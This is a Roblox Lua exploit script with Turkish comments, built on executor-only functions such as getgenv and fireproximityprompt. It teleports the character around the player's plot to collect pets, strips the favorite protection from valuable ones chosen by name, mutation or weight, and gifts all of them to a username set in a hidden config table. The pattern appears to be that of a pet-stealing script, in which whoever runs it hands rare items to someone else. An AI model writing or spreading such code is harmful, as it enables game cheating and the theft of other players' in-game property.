-- ✅ OYUN YÜKLENME KONTROLÜ
if not game:IsLoaded() then
    game.Loaded:Wait()
end

-- Servisler
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")
local backpack = player:WaitForChild("Backpack")

local remotesFolder = ReplicatedStorage:WaitForChild("Remotes", 10)
if not remotesFolder then
    warn("❌ Remotes klasörü bulunamadı! Script durduruluyor.")
    return
end

local giftEvent = remotesFolder:WaitForChild("GiftItem", 10)
local favoriteEvent = remotesFolder:WaitForChild("FavoriteItem", 10)
if not giftEvent or not favoriteEvent then
    warn("❌ GiftItem veya FavoriteItem event'leri bulunamadı! Script durduruluyor.")
    return
end

----------------------------------------------------------------------
-- ⚙️ getgenv().tradeconfig AYARLARI
----------------------------------------------------------------------
local cfg = getgenv().tradeconfig or {}

local targetPetNames1 = cfg.GIFT_PET or {
    ""
}

local weight = cfg.GIFT_WEIGHT or 10

local mutations = cfg.GIFT_MUTATIONS or {
    ""
}

local recipientUsername = cfg.GIFT_USERNAME or ""

----------------------------------------------------------------------
-- 🌀 TELEPORT VE TOPLAMA
----------------------------------------------------------------------
local collectedCount = 0

local function teleportAndTrigger(folder)
    local brainrot = folder:FindFirstChild("Brainrot")
    if not brainrot then return end

    local platformUI = brainrot:FindFirstChild("PlatformUI")
    if not platformUI then return end

    local title = platformUI:FindFirstChild("Title")
    if not title or not title:IsA("TextLabel") then return end

    local hitbox = folder:FindFirstChild("Hitbox") or folder:FindFirstChild("BrainrotHitbox")
    if hitbox then
        hrp.CFrame = hitbox.CFrame + Vector3.new(0, 3, 0)
        task.wait(0.3)

        local prompt = hitbox:FindFirstChildOfClass("ProximityPrompt")
        if prompt then
            fireproximityprompt(prompt)
            collectedCount += 1
            print("✅ Pet toplandı:", title.Text)
            task.wait(1)
        end
    end
end

----------------------------------------------------------------------
-- 🔍 SADECE KENDİ PLOTU
----------------------------------------------------------------------
local function collectMyPlotOnly()
    local myPlotNumber = player:GetAttribute("Plot")
    if not myPlotNumber then
        warn("❌ Player'ın Plot attribute'u yok!")
        return
    end

    local plots = workspace:WaitForChild("Plots", 10)
    if not plots then return end

    local plot = plots:FindFirstChild(tostring(myPlotNumber))
    if not plot then return end

    print("📦 Kendi Plot:", plot.Name)

    for _, folderName in ipairs({"Brainrots", "Plants"}) do
        local folder = plot:FindFirstChild(folderName)
        if folder then
            for _, obj in ipairs(folder:GetChildren()) do
                if tonumber(obj.Name) ~= nil then
                    teleportAndTrigger(obj)
                end
            end
        end
    end
end

----------------------------------------------------------------------
-- 🎁 GÖNDERME FİLTRELERİ
----------------------------------------------------------------------
local function isTargetPetName(petName)
    if not petName then return false end
    local lowerName = petName:lower()
    for _, targetName in ipairs(targetPetNames1) do
        if lowerName:find(targetName:lower(), 1, true) then
            return true
        end
    end
    return false
end

local function extractWeightFromName(petName)
    if not petName then return nil end
    local name = petName:gsub(",", "."):lower()
    local w = name:match("%[(%d+%.?%d*)%s*kg%]") or name:match("(%d+%.?%d*)%s*kg")
    if w then return tonumber(w) end
    return nil
end

local function isMutationMatch(petName)
    if not petName then return false end
    for _, exactName in ipairs(mutations) do
        if petName == exactName or petName:find(exactName, 1, true) then
            return true
        end
    end
    return false
end

local function shouldGiftPet(petName)
    if not petName then return false end
    if isTargetPetName(petName) then return true end
    if isMutationMatch(petName) then return true end
    local w = extractWeightFromName(petName)
    if w and w >= weight then return true end
    return false
end

----------------------------------------------------------------------
-- 🔓 FAVORİ KALDIRMA + GÖNDERME
----------------------------------------------------------------------
local function unfavoriteSelectedPets()
    print("🔹 Unfavorite başlatıldı.")
    for _, pet in ipairs(backpack:GetChildren()) do
        if (pet:IsA("Tool") or pet:IsA("Model")) and shouldGiftPet(pet.Name) then
            local attributes = pet:FindFirstChild("Attributes")
            if attributes then
                local idValue = attributes:FindFirstChild("ID")
                if idValue then
                    favoriteEvent:FireServer(idValue.Value)
                    task.wait(0.3)
                end
            end
        end
    end
end

local function getAllMatchingPets()
    local pets = {}
    for _, container in ipairs({backpack, character}) do
        for _, item in ipairs(container:GetChildren()) do
            if (item:IsA("Tool") or item:IsA("Model")) and shouldGiftPet(item.Name) then
                table.insert(pets, item)
            end
        end
    end
    return pets
end

local function sendAllMatchingPets()
    print("🎁 Gönderim başlıyor...")
    local pets = getAllMatchingPets()
    for _, pet in ipairs(pets) do
        if pet.Parent ~= character then
            pet.Parent = character
            task.wait(0.2)
        end
        giftEvent:FireServer({{ Item = pet, ToGift = recipientUsername }})
        local timeout = 5
        local startTime = tick()
        while pet.Parent ~= nil and tick() - startTime < timeout do
            task.wait(0.1)
        end
        task.wait(0.3)
    end
    print("✅ Gönderim tamamlandı.")
end

----------------------------------------------------------------------
-- 🧩 ANA AKIŞ
----------------------------------------------------------------------
local function main()
    for i = 1, 3 do
        print("🔁 Plot kontrolü ("..i.."/3)")
        collectMyPlotOnly()
        task.wait(1)
    end
    print("📦 Toplam toplanan pet:", collectedCount)
    unfavoriteSelectedPets()
    sendAllMatchingPets()
end

task.spawn(function()
    task.wait(1)
    main()
end)
